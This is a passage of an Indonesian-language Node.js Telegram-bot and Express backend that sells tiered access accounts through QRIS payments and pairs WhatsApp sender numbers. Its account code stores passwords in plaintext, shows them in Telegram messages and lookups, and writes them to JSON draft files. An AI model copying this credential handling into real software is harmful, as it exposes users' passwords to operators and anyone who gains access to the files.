      createdByTelegramId: userId,
      createdByUsername: creatorUsername
    });
    clearFlow(userId);

    if (!result.ok) return bot.sendMessage(chatId, result.message, { parse_mode: 'HTML' });

    if (ACC_GROUP_ID) {
      try {
        await bot.sendMessage(ACC_GROUP_ID,
          `🌟 <b>BERKAH BATCH</b>\n\nPEMULA: <code>${creatorUsername}</code> (TG <code>${userId}</code>)\nRole: <b>${result.role.toUpperCase()}</b>\nJumlah: <b>${result.count}</b>\nExpired: ${result.expiredDate}\n\nBatch: <code>${Date.now()}</code>`,
          { parse_mode: 'HTML' }
        );
      } catch (_) {}
    }

    const list = result.accounts.map((a, i) => `${i + 1}. <code>${a.username}</code> | <code>${a.password}</code>`);
    const header = `✅ <b>AKUN BERKAH DIBUAT</b>\n\nRole: <b>${result.role.toUpperCase()}</b>\nDurasi: ${BERKAH_CONFIG.DURATION_DAYS} hari\nJumlah: ${result.count}\nExpired: ${result.expiredDate}\n\n`;

    for (let i = 0; i < list.length; i += 20) {
      const chunk = list.slice(i, i + 20).join('\n');
      const prefix = i === 0 ? header : '';
      await bot.sendMessage(chatId, prefix + chunk, { parse_mode: 'HTML' });
    }
    return;
  }

  if (flow.step === 'ROLE_CREATE_USERNAME') {
    const username = text.trim();
    if (!/^[a-zA-Z0-9_]{3,32}$/.test(username)) return bot.sendMessage(chatId, '❌ Username 3-32 karakter: huruf, angka, underscore.');
    if (loadDatabase().some(u => u.username === username)) return bot.sendMessage(chatId, '❌ Username sudah dipakai. Kirim username lain.');
    setFlow(userId, 'ROLE_CREATE_PASSWORD', { ...flow, username });
    return bot.sendMessage(chatId, '🔐 Masukkan <b>password</b>.', { parse_mode: 'HTML' });
  }

  if (flow.step === 'ROLE_CREATE_PASSWORD') {
    const password = text.trim();
    if (password.length < 4 || password.length > 128) return bot.sendMessage(chatId, '❌ Password harus 4-128 karakter.');
    setFlow(userId, 'ROLE_CREATE_DAYS', { ...flow, password });
    return bot.sendMessage(chatId, '⏳ Pilih durasi akun:', { reply_markup: { inline_keyboard: [[{text:'1 Hari',callback_data:'days_1'},{text:'7 Hari',callback_data:'days_7'}],[{text:'30 Hari',callback_data:'days_30'},{text:'90 Hari',callback_data:'days_90'}],[{text:'365 Hari',callback_data:'days_365'}]] } });
  }

  if (flow.step === 'PEMULA_CREATE_USERNAME') {
    const username = text.trim();
    if (!/^[a-zA-Z0-9_]{3,32}$/.test(username)) return bot.sendMessage(chatId, '❌ Username 3-32 karakter.');
    if (loadDatabase().some(u => u.username === username)) return bot.sendMessage(chatId, '❌ Username sudah dipakai.');
    setFlow(userId, 'PEMULA_CREATE_PASSWORD', { ...flow, username });
    return bot.sendMessage(chatId, '🔐 Masukkan <b>password</b>.', { parse_mode: 'HTML' });
  }
  if (flow.step === 'PEMULA_CREATE_PASSWORD') {
    const password = text.trim();
    if (password.length < 4 || password.length > 128) return bot.sendMessage(chatId, '❌ Password harus 4-128 karakter.');
    setFlow(userId, 'PEMULA_CREATE_DAYS', { ...flow, password });
    return bot.sendMessage(chatId, '⏳ Pilih durasi akun:', { reply_markup: { inline_keyboard: [[{text:'1 Hari',callback_data:'pemuladays_1'},{text:'7 Hari',callback_data:'pemuladays_7'}],[{text:'30 Hari',callback_data:'pemuladays_30'},{text:'90 Hari',callback_data:'pemuladays_90'}],[{text:'365 Hari',callback_data:'pemuladays_365'}]] } });
  }

  if (flow.step === 'PEMULA_CUSTOM_USERNAME') {
    const username = text.trim();
    if (!/^[a-zA-Z0-9_]{3,32}$/.test(username)) return bot.sendMessage(chatId, '❌ Username 3-32 karakter.');
    if (loadDatabase().some(u => u.username === username)) return bot.sendMessage(chatId, '❌ Username sudah dipakai.');
    setFlow(userId, 'PEMULA_CUSTOM_PASSWORD', { ...flow, username });
    return bot.sendMessage(chatId, '🔐 Masukkan <b>password</b>.', { parse_mode: 'HTML' });
  }
  if (flow.step === 'PEMULA_CUSTOM_PASSWORD') {
    const password = text.trim();
    if (password.length < 4 || password.length > 128) return bot.sendMessage(chatId, '❌ Password harus 4-128 karakter.');
    setFlow(userId, 'PEMULA_CUSTOM_ROLE', { ...flow, username: flow.username, password });
    const roleButtons = ROLE_HIERARCHY.filter(r => r !== 'pemula').map(r => [{text:r.toUpperCase(), callback_data:`customrole_${r}`}]);
    return bot.sendMessage(chatId, '👑 Pilih <b>role</b> akun:', { parse_mode: 'HTML', reply_markup: { inline_keyboard: roleButtons } });
  }

  if (flow.step === 'PEMULA_GLOBAL_SENDER_NUMBER') {
    const roleNow = await resolveTelegramRole(userId);
    if (roleNow !== 'PEMULA' && roleNow !== 'DEV') { clearFlow(userId); return bot.sendMessage(chatId, '❌ Hanya PEMULA.'); }
    const number = text.replace(/\D/g, '');
    if (number.length < 8 || number.length > 15) return bot.sendMessage(chatId, '❌ Nomor tidak valid. Kirim nomor internasional tanpa + atau spasi.');
    try {
      const code = await pairingGlobal(number);
      clearFlow(userId);
      if (!code) return bot.sendMessage(chatId, '❌ Gagal membuat pairing code Sender Global.');
      return bot.sendMessage(chatId, `🌐 <b>SENDER GLOBAL</b>\n\nNomor: <code>${number}</code>\nPairing Code: <code>${code}</code>\n\nHubungkan nomor tersebut ke WhatsApp.`, { parse_mode: 'HTML' });
    } catch (e) {
      clearFlow(userId);
      return bot.sendMessage(chatId, `❌ Gagal pairing: ${e.message}`);
    }
  }

  if (flow.step === 'PEMULA_CEKUSER') {
    const targetId = msg.reply_to_message?.from?.id || Number(text.trim());
    if (!targetId) { clearFlow(userId); return bot.sendMessage(chatId, '❌ ID tidak valid.'); }
    const targetRole = await resolveTelegramRole(targetId);
    const db = loadDatabase();
    const acc = db.find(u => Number(u.telegramId) === Number(targetId));
    clearFlow(userId);
    let out = `<b>CEK USER</b>\n\nID: <code>${targetId}</code>\nRole: <b>${targetRole || 'MEMBER'}</b>\n`;
    if (acc) out += `\nUsername: <b>${acc.username}</b>\nPassword: <b>${acc.password}</b>\nExpired: <b>${acc.expiredDate}</b>\nUID: <code>${acc.uid || '-'}</code>`;
    else out += '\n❌ Belum punya akun.';
    return bot.sendMessage(chatId, out, { parse_mode: 'HTML' });
  }

  if (flow.step === 'PEMULA_UPROLE') {
    const targetId = Number(text.trim());
    if (!targetId) { clearFlow(userId); return bot.sendMessage(chatId, '❌ ID tidak valid.'); }

    const currentRole = await resolveTelegramRole(targetId);
    const allRoleKeys = GROUP_ROLES_VALID.map(r => r.toLowerCase());
    const idx = allRoleKeys.indexOf((currentRole || '').toLowerCase());
    if (idx === -1 || idx <= 0) {
      clearFlow(userId);
      return bot.sendMessage(chatId, `❌ User role ${currentRole || 'MEMBER'}, tidak bisa diup.`);
    }
    const nextRole = GROUP_ROLES_VALID[idx - 1];

    const groups = getGroupsByRole(nextRole);
    if (!groups.length) { clearFlow(userId); return bot.sendMessage(chatId, `❌ Belum ada group dengan role ${nextRole}.`); }

    let link = '';
    try {
      const invite = await bot.createChatInviteLink(groups[0], { member_limit: 1, name: `Up Role ${nextRole}` });
      link = invite.invite_link;
    } catch (e) { clearFlow(userId); return bot.sendMessage(chatId, `❌ Gagal bikin link: ${e.message}`); }

    clearFlow(userId);
    return bot.sendMessage(chatId, `⬆️ <b>UP ROLE ${currentRole} → ${nextRole}</b>\n\nShare link ini ke user:\n<code>${link}</code>`, { parse_mode: 'HTML' });
  }

  if (flow.step === 'PEMULA_LINK') {
    const roleArg = text.trim().toUpperCase();
    if (!GROUP_ROLES_VALID.includes(roleArg)) {
      clearFlow(userId);
      return bot.sendMessage(chatId, `❌ Role tidak valid. Pilih: ${GROUP_ROLES_VALID.join(' / ')}`);
    }
    const groups = getGroupsByRole(roleArg);
    if (!groups.length) { clearFlow(userId); return bot.sendMessage(chatId, `❌ Belum ada group role ${roleArg}.`); }
    try {
      const invite = await bot.createChatInviteLink(groups[0], { name: `Join ${roleArg}` });
      clearFlow(userId);
      return bot.sendMessage(chatId, `🔗 <b>LINK GROUP ${roleArg}</b>\n\n<code>${invite.invite_link}</code>`, { parse_mode: 'HTML' });
    } catch (e) { clearFlow(userId); return bot.sendMessage(chatId, `❌ ${e.message}`); }
  }

  if (flow.step === 'PEMULA_HAPUS') {
    const username = text.trim();
    const db = loadDatabase();
    const idx = db.findIndex(u => u.username === username);
    clearFlow(userId);
    if (idx === -1) return bot.sendMessage(chatId, '❌ Username tidak ditemukan.');
    const removed = db.splice(idx, 1)[0];
    saveDatabase(db);
    return bot.sendMessage(chatId, `🗑 User <b>${removed.username}</b> dihapus dari database.`, { parse_mode: 'HTML' });
  }

  if (flow.step === 'PEMULA_EXPIRED') {
    const [username, days] = text.split('|').map(s => s.trim());
    const db = loadDatabase();
    const u = db.find(x => x.username === username);
    clearFlow(userId);
    if (!u) return bot.sendMessage(chatId, '❌ User tidak ditemukan.');
    const add = Number(days);
    if (!Number.isInteger(add) || add <= 0) return bot.sendMessage(chatId, '❌ Hari tidak valid.');
    const cur = new Date(u.expiredDate);
    cur.setDate(cur.getDate() + add);
    u.expiredDate = cur.toISOString().split("T")[0];
    saveDatabase(db);
    return bot.sendMessage(chatId, `✅ Expired <b>${u.username}</b> → <b>${u.expiredDate}</b>`, { parse_mode: 'HTML' });
  }
});

function getTelegramUserUsername(tgId) {
  const db = loadDatabase();
  const acc = db.find(u => Number(u.telegramId) === Number(tgId));
  return acc ? acc.username : null;
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 14/15");
console.log("    STATUS : BOT CALLBACK + BERKAH + CEK LENGKAP OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 15/15: QRIS PAYMENT GATEWAY (BuatQris) + ALL ENDPOINTS
//  - Tax (pajak create akun fullup/reseller)
//  - Buy Access (beli akun otomatis)
//  - Role Up (upgrade role otomatis)
//  - Webhook /callback/buatqris (verifikasi + cross-check)
//  - Auto-clean + FCM + server.listen
// ═══════════════════════════════════════════════════════════════════════

// ─── BuatQris Config ──────────────────────────────────────────────────
const BUATQRIS_BASE        = 'https://api.buatqris.site';
const BUATQRIS_ACCOUNT_ID  = String(process.env.BUATQRIS_ACCOUNT_ID || '').trim();
const BUATQRIS_SECRET      = String(process.env.BUATQRIS_SECRET || '').trim();
const BUATQRIS_SIGNING     = String(process.env.BUATQRIS_SIGNING_SECRET || '').trim();
const BUATQRIS_CALLBACK    = String(process.env.BUATQRIS_CALLBACK_URL || '').trim();

// ─── BuatQris Helpers ─────────────────────────────────────────────────
function bqIsValid() {
  return !!(BUATQRIS_ACCOUNT_ID && BUATQRIS_SECRET);
}

async function bqCreateQris({ amount, description }) {
  if (!bqIsValid()) throw new Error('BuatQris belum dikonfigurasi di .env');
  const params = new URLSearchParams();
  params.append('action', 'api_create_qris');
  params.append('account_id', BUATQRIS_ACCOUNT_ID);
  params.append('secret_token', BUATQRIS_SECRET);
  params.append('amount', String(Math.max(1000, Math.round(amount))));
  params.append('description', String(description || '').slice(0, 100));
  params.append('fee_by', 'buyer');
  if (BUATQRIS_CALLBACK) params.append('callback_url', BUATQRIS_CALLBACK);

  const r = await axios.post(BUATQRIS_BASE, params, {
    timeout: 25000,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-App-Name': 'SONATA',
    },
  });
  const d = r.data || {};
  if (d.success !== true || !d.data) {
    throw new Error(d.message || 'BuatQris: gagal create QRIS');
  }
  return d.data;
}

async function bqCheckStatus(transactionId) {
  if (!bqIsValid()) return { error: 'BuatQris belum dikonfigurasi' };
  const params = new URLSearchParams();
  params.append('action', 'api_check_status');
  params.append('account_id', BUATQRIS_ACCOUNT_ID);
  params.append('secret_token', BUATQRIS_SECRET);
  params.append('transaction_id', String(transactionId));

  const r = await axios.post(BUATQRIS_BASE, params, {
    timeout: 15000,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    validateStatus: () => true,
  });
  const d = r.data || {};
  if (r.status === 429) {
    return { rateLimited: true, retryAfter: Number(d.retry_after || 20) };
  }
  if (d.success !== true || !d.data) {
    return { error: d.message || 'BuatQris: gagal check status' };
  }
  return { data: d.data };
}

// ─── JSON file helpers (draft tax/buy/upgrade) ────────────────────────
const TAX_DRAFT_FILE    = path.join(__dirname, 'tax_drafts.json');
const BUY_DRAFT_FILE    = path.join(__dirname, 'buy_drafts.json');
const UPGRADE_DRAFT_FILE = path.join(__dirname, 'upgrade_drafts.json');

function loadArr(fp) {
  const d = loadJsonFile(fp, []);
  return Array.isArray(d) ? d : [];
}
function saveArr(fp, arr) {
  saveJsonFile(fp, Array.isArray(arr) ? arr : []);
}
function pruneDrafts(fp, ttlMs = 30 * 60 * 1000) {
  const arr = loadArr(fp);
  const now = Date.now();
  const out = arr.filter(x => x && x.status !== 'done' && x.status !== 'cancelled' && Number(x.createdMs || 0) + ttlMs > now);
  if (out.length !== arr.length) saveArr(fp, out);
  return out;
}

// ═══════════════════════════════════════════════════════════════════════
//  A. PAJAK CREATE AKUN (tax) — fullup 4k, reseller 8k, member 0
// ═══════════════════════════════════════════════════════════════════════
const TAX_BY_ROLE = { member: 0, fullup: 4000, reseller: 8000 };

app.post('/api/tax/create', ratRequireAuth, async (req, res) => {
  try {
    const role = String(req.body.role || '').toLowerCase();
    const sellerRole = String(ratGetRole(req.username) || '').toLowerCase();
    if (!['owner', 'reseller'].includes(sellerRole)) {
      return res.status(403).json({ ok: false, message: 'Hanya OWNER/RESELLER yang boleh create akun.' });
    }
    const amount = TAX_BY_ROLE[role];
    if (amount === undefined) {
      return res.status(400).json({ ok: false, message: 'Role tidak valid.' });
    }
    if (amount === 0) {
      return res.status(400).json({ ok: false, message: 'Role member tidak perlu pajak.' });
    }

    const q = await bqCreateQris({
      amount,
      description: `Pajak ${role} — seller ${req.username}`,
    });

    pruneDrafts(TAX_DRAFT_FILE);
    const drafts = loadArr(TAX_DRAFT_FILE);
    const draftId = 'td_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
    drafts.push({
      draftId,
      sellerUsername: req.username,
      role,
      amount: Number(q.amount || amount),
      totalAmount: Number(q.total_amount || amount),
      qrUrl: q.qr_url || q.qris_image || '',
      paymentUrl: q.payment_url || '',
      transactionId: String(q.transaction_id || ''),
      expiredAt: q.expired_at || null,
      status: 'pending',
      createdMs: Date.now(),
      createdAt: new Date().toISOString(),
    });
    saveArr(TAX_DRAFT_FILE, drafts);

    return res.json({
      ok: true,
      transactionId: q.transaction_id,
      qrUrl: q.qr_url || q.qris_image,
      paymentUrl: q.payment_url,
      amount: q.amount,
      totalAmount: q.total_amount,
      expiredAt: q.expired_at,
    });
  } catch (e) {
    console.error('[TAX create]', e.message);
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.get('/api/tax/status/:trxId', ratRequireAuth, async (req, res) => {
  try {
    const trxId = String(req.params.trxId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'trxId wajib.' });
    const drafts = loadArr(TAX_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    if (drafts[idx].status === 'success') {
      return res.json({ ok: true, status: 'success' });
    }

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', rateLimited: true, retryAfter: r.retryAfter });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const refreshed = loadArr(TAX_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.transactionId === trxId);
      if (ridx >= 0) {
        refreshed[ridx].status = 'success';
        refreshed[ridx].paidAt = new Date().toISOString();
        saveArr(TAX_DRAFT_FILE, refreshed);
      }
    }
    return res.json({ ok: true, status });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.post('/api/tax/manual-confirm', ratRequireAuth, async (req, res) => {
  try {
    const trxId = String(req.body.transactionId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'transactionId wajib.' });
    const drafts = loadArr(TAX_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    if (drafts[idx].status === 'success') return res.json({ ok: true, status: 'success' });

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', message: `Rate limit. Coba lagi ${r.retryAfter}s.` });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const refreshed = loadArr(TAX_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.transactionId === trxId);
      if (ridx >= 0) {
        refreshed[ridx].status = 'success';
        refreshed[ridx].paidAt = new Date().toISOString();
        saveArr(TAX_DRAFT_FILE, refreshed);
      }
      return res.json({ ok: true, status: 'success' });
    }
    return res.json({ ok: true, status, message: status === 'pending' ? 'Belum terdeteksi. Coba lagi 1-2 menit lagi.' : '' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

// Validasi pajak saat create akun seller
async function validateTaxForCreate(taxTransactionId, role) {
  const amount = TAX_BY_ROLE[String(role).toLowerCase()];
  if (amount === undefined) return { ok: false, message: 'Role tidak valid' };
  if (amount === 0) return { ok: true }; // member gratis

  if (!taxTransactionId) return { ok: false, message: 'Pajak belum dibayar.' };
  const drafts = loadArr(TAX_DRAFT_FILE);
  const draft = drafts.find(d => String(d.transactionId) === String(taxTransactionId));
  if (!draft) return { ok: false, message: 'Transaksi pajak tidak ditemukan.' };
  if (draft.status !== 'success') return { ok: false, message: 'Pajak belum lunas.' };
  if (String(draft.role).toLowerCase() !== String(role).toLowerCase()) {
    return { ok: false, message: 'Pajak tidak sesuai role.' };
  }
  if (draft.usedForCreate) return { ok: false, message: 'Transaksi pajak sudah dipakai.' };
  return { ok: true, draft };
}

// ═══════════════════════════════════════════════════════════════════════
//  B. BUY ACCESS — beli akun otomatis (via QRIS)
// ═══════════════════════════════════════════════════════════════════════
const BUY_PACKAGES = {
  member_day:   { role: 'member',   day: 1,  price: 2000,   label: 'MEMBER 1 HARI',   description: 'Akses 1 hari · fitur member' },
  member_week:  { role: 'member',   day: 7,  price: 10000,  label: 'MEMBER 1 MINGGU', description: 'Akses 7 hari · fitur member' },
  member_month: { role: 'member',   day: 30, price: 20000,  label: 'MEMBER 1 BULAN',  description: 'Akses 30 hari · fitur member' },
  fullup:       { role: 'fullup',   day: 30, price: 40000,  label: 'FULLUP',          description: 'Akses 30 hari · semua fitur dasar' },
  reseller:     { role: 'reseller', day: 30, price: 80000,  label: 'RESELLER',        description: 'Akses 30 hari · fitur reseller' },
  owner:        { role: 'owner',    day: 30, price: 180000, label: 'OWNER',           description: 'Akses 30 hari · kontrol penuh' },
};

app.get('/api/buy/packages', (req, res) => {
  const list = Object.entries(BUY_PACKAGES).map(([productId, p]) => ({
    productId, role: p.role, day: p.day, price: p.price,
    label: p.label, description: p.description,
  }));
  res.json({ ok: true, packages: list });
});

app.post('/api/buy/check-username', (req, res) => {
  try {
    const username = String(req.body.username || '').trim();
    const productId = String(req.body.productId || '').trim();
    if (!/^[a-zA-Z0-9_.-]{3,32}$/.test(username)) {
      return res.status(400).json({ ok: false, message: 'Username tidak valid (3-32, huruf/angka/._-).' });
    }
    if (!BUY_PACKAGES[productId]) return res.status(400).json({ ok: false, message: 'Paket tidak valid.' });

    if (loadDatabase().find(u => String(u.username).toLowerCase() === username.toLowerCase())) {
      return res.json({ ok: true, available: false, message: 'Username sudah dipakai.' });
    }

    pruneDrafts(BUY_DRAFT_FILE);
    const drafts = loadArr(BUY_DRAFT_FILE);
    const now = Date.now();
    const taken = drafts.find(d =>
      String(d.username || '').toLowerCase() === username.toLowerCase() &&
      d.status === 'pending' && Number(d.reservedUntilMs || 0) > now
    );
    if (taken) {
      return res.json({ ok: true, available: false, message: 'Username sedang di-reserve. Coba username lain.' });
    }

    const draftId = 'bd_' + now + '_' + crypto.randomBytes(4).toString('hex');
    const draft = {
      draftId, username, productId,
      status: 'pending',
      reservedUntilMs: now + 15 * 60 * 1000,
      reservedUntil: new Date(now + 15 * 60 * 1000).toISOString(),
      hardExpiry: now + 30 * 60 * 1000,
      createdMs: now,
      createdAt: new Date().toISOString(),
    };
    drafts.push(draft);
    saveArr(BUY_DRAFT_FILE, drafts);

    return res.json({ ok: true, available: true, draftId, reservedUntil: draft.reservedUntil });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.post('/api/buy/create', async (req, res) => {
  try {
    const { draftId, username, password, productId } = req.body || {};
    if (!draftId || !username || !password || !productId) {
      return res.status(400).json({ ok: false, message: 'Data tidak lengkap.' });
    }
    if (password.length < 4 || password.length > 64) {
      return res.status(400).json({ ok: false, message: 'Password tidak valid.' });
    }
    const plan = BUY_PACKAGES[productId];
    if (!plan) return res.status(400).json({ ok: false, message: 'Paket tidak valid.' });

    pruneDrafts(BUY_DRAFT_FILE);
    const drafts = loadArr(BUY_DRAFT_FILE);
    const idx = drafts.findIndex(d => d.draftId === draftId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Draft tidak ditemukan / expired.' });
    const draft = drafts[idx];
    if (draft.status !== 'pending') return res.status(409).json({ ok: false, message: 'Draft sudah diproses.' });
    if (String(draft.username).toLowerCase() !== String(username).toLowerCase()) {
      return res.status(409).json({ ok: false, message: 'Username tidak cocok dengan draft.' });
    }
    if (Date.now() > Number(draft.hardExpiry || 0)) {
      drafts.splice(idx, 1);
      saveArr(BUY_DRAFT_FILE, drafts);
      return res.status(410).json({ ok: false, message: 'Draft expired.' });
    }

    const q = await bqCreateQris({
      amount: plan.price,
      description: `Buy ${plan.label} — ${username}`,
    });

    drafts[idx].password = password;
    drafts[idx].transactionId = String(q.transaction_id || '');
    drafts[idx].amount = Number(q.amount || plan.price);
    drafts[idx].totalAmount = Number(q.total_amount || plan.price);
    drafts[idx].qrUrl = q.qr_url || q.qris_image || '';
    drafts[idx].paymentUrl = q.payment_url || '';
    drafts[idx].expiredAt = q.expired_at || null;
    drafts[idx].createdQrisMs = Date.now();
    saveArr(BUY_DRAFT_FILE, drafts);

    return res.json({
      ok: true,
      transactionId: drafts[idx].transactionId,
      qrUrl: drafts[idx].qrUrl,
      paymentUrl: drafts[idx].paymentUrl,
      amount: drafts[idx].amount,
      totalAmount: drafts[idx].totalAmount,
      expiredAt: drafts[idx].expiredAt,
    });
  } catch (e) {
    console.error('[BUY create]', e.message);
    return res.status(500).json({ ok: false, message: e.message });
  }
});

async function createAccountForBuyDraft(draft) {
  if (!draft || draft.status === 'done') return { ok: false, reason: 'already' };
  if (loadDatabase().find(u => String(u.username).toLowerCase() === String(draft.username).toLowerCase())) {
    return { ok: false, reason: 'conflict' };
  }
  const plan = BUY_PACKAGES[draft.productId];
  if (!plan) return { ok: false, reason: 'invalid_plan' };

  const account = buildAccountObject({
    username: draft.username,
    password: draft.password,
    role: plan.role,
    day: plan.day,
    createdBy: 'BUY_ACCESS',
  });
  const result = await commitAccountCreate(account, {
    status: 'accepted',
    source: 'BUY_ACCESS',
    note: `Auto-create via BuatQris trxId=${draft.transactionId}`,
  });
  if (!result.ok) return { ok: false, reason: result.message || 'create_failed' };
  return { ok: true, account };
}

app.get('/api/buy/status/:trxId', async (req, res) => {
  try {
    const trxId = String(req.params.trxId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'trxId wajib.' });
    const drafts = loadArr(BUY_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    const draft = drafts[idx];

    if (draft.status === 'done' && draft.accountResult) {
      return res.json({ ok: true, status: 'success', account: draft.accountResult });
    }
    if (draft.status === 'conflict') {
      return res.json({ ok: true, status: 'conflict', message: 'Username sudah dipakai. Hubungi admin untuk refund.' });
    }

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', rateLimited: true, retryAfter: r.retryAfter });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const create = await createAccountForBuyDraft(draft);
      const refreshed = loadArr(BUY_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.draftId === draft.draftId);
      if (ridx >= 0) {
        if (create.ok) {
          refreshed[ridx].status = 'done';
          refreshed[ridx].doneAt = new Date().toISOString();
          refreshed[ridx].accountResult = {
            username: create.account.username,
            password: create.account.password,
            role: create.account.role,
            expiredDate: create.account.expiredDate,
          };
        } else if (create.reason === 'conflict') {
          refreshed[ridx].status = 'conflict';
        }
        saveArr(BUY_DRAFT_FILE, refreshed);
      }
      if (create.ok) return res.json({ ok: true, status: 'success', account: create.account });
      return res.json({ ok: true, status: create.reason === 'conflict' ? 'conflict' : 'failed', message: create.reason || 'Gagal create.' });
    }
    return res.json({ ok: true, status });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.post('/api/buy/manual-confirm', async (req, res) => {
  try {
    const trxId = String(req.body.transactionId || '').trim();
    if (!trxId) return res.status(400).json({ ok: false, message: 'transactionId wajib.' });
    const drafts = loadArr(BUY_DRAFT_FILE);
    const idx = drafts.findIndex(d => String(d.transactionId) === trxId);
    if (idx < 0) return res.status(404).json({ ok: false, message: 'Transaksi tidak ditemukan.' });
    if (drafts[idx].status === 'done' && drafts[idx].accountResult) {
      return res.json({ ok: true, status: 'success', account: drafts[idx].accountResult });
    }

    const r = await bqCheckStatus(trxId);
    if (r.rateLimited) return res.json({ ok: true, status: 'pending', message: `Rate limit. Coba lagi ${r.retryAfter}s.` });
    if (r.error) return res.status(502).json({ ok: false, message: r.error });

    const status = String(r.data.status || 'pending').toLowerCase();
    if (status === 'success') {
      const draft = drafts[idx];
      const create = await createAccountForBuyDraft(draft);
      const refreshed = loadArr(BUY_DRAFT_FILE);
      const ridx = refreshed.findIndex(d => d.draftId === draft.draftId);
      if (ridx >= 0) {
        if (create.ok) {
          refreshed[ridx].status = 'done';
          refreshed[ridx].doneAt = new Date().toISOString();
          refreshed[ridx].accountResult = {
            username: create.account.username,
            password: create.account.password,
            role: create.account.role,
            expiredDate: create.account.expiredDate,
          };
        } else if (create.reason === 'conflict') {
          refreshed[ridx].status = 'conflict';
        }
        saveArr(BUY_DRAFT_FILE, refreshed);
      }
      if (create.ok) return res.json({ ok: true, status: 'success', account: create.account });
      return res.json({ ok: true, status: create.reason === 'conflict' ? 'conflict' : 'failed', message: create.reason || 'Gagal create.' });
    }
    return res.json({ ok: true, status });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  C. ROLE UP — upgrade role otomatis (via QRIS)
// ═══════════════════════════════════════════════════════════════════════
const ROLE_PRICES_UP = { fullup: 40000, reseller: 80000, owner: 180000 };
const MEMBER_PACKAGES = { 1: 2000, 7: 10000, 30: 20000 };
const MEMBER_HISTORY_PRICES = { 1: 2000, 7: 7000, 30: 15000 };
const UP_TARGETS = {
  member:   ['fullup', 'reseller', 'owner'],
  fullup:   ['reseller', 'owner'],
  reseller: ['owner'],
  owner:    [],
};

function currentRoleValue(user) {
  const role = String(user.role || 'member').toLowerCase();
  const day = Number(user.day || 0);
  if (role === 'member') {
    const fallback = MEMBER_PACKAGES[day] || (day >= 30 ? 20000 : day >= 7 ? 10000 : 2000);
    return fallback;
  }
  if (ROLE_PRICES_UP[role]) return ROLE_PRICES_UP[role];
  return 0;
}

function historyValueForUser(username) {
  try {
    const raw = loadPurchases();
    const my = raw
      .filter(x => x && x.status === 'accepted' && x.account && String(x.account.username) === String(username))
      .sort((a, b) => String(b.decidedAt || b.createdAt || '').localeCompare(String(a.decidedAt || a.createdAt || '')));
    if (!my.length) return null;
    const last = my[0];
    const product = String(last.product || '');
    if (product === 'member_day') return 2000;
    if (product === 'member_week') return MEMBER_HISTORY_PRICES[7];
    if (product === 'member_month') return MEMBER_HISTORY_PRICES[30];
    if (product === 'fullup') return ROLE_PRICES_UP.fullup;
    if (product === 'reseller') return ROLE_PRICES_UP.reseller;
    if (product === 'owner') return ROLE_PRICES_UP.owner;
    return null;
  } catch (_) { return null; }
}

function computeUpgradeOption(user, toRole) {
  const cur = String(user.role || 'member').toLowerCase();
  if (!UP_TARGETS[cur] || !UP_TARGETS[cur].includes(toRole)) return null;
  const targetPrice = ROLE_PRICES_UP[toRole];
  let curValue = currentRoleValue(user);
  if (cur === 'member') {
    const h = historyValueForUser(user.username);
    if (h != null) curValue = h;
  }
  const price = Math.max(0, targetPrice - curValue);
  return {
    toRole,
    label: toRole.toUpperCase(),
    price,
    description: curValue > 0 ? `${toRole} − nilai ${cur.toUpperCase()}` : `Upgrade ke ${toRole}`,
    fromValue: curValue,
    targetPrice,
  };
}

app.get('/api/upgrade/options', ratRequireAuth, (req, res) => {
  try {
    const user = loadDatabase().find(u => u.username === req.username);
    if (!user) return res.status(404).json({ ok: false, message: 'Akun tidak ditemukan.' });
    const curRole = String(user.role || 'member').toLowerCase();
    const targets = UP_TARGETS[curRole] || [];
    const options = targets.map(t => computeUpgradeOption(user, t)).filter(Boolean);
    return res.json({
      ok: true,
      currentRole: curRole,
      currentValue: currentRoleValue(user),
      options,
    });
  } catch (e) {
    return res.status(500).json({ ok: false, message: e.message });
  }
});

app.post('/api/upgrade/create', ratRequireAuth, async (req, res) => {
  try {
    const toRole = String(req.body.toRole || '').toLowerCase();
    if (!ROLE_PRICES_UP[toRole]) return res.status(400).json({ ok: false, message: 'Role tujuan tidak valid.' });

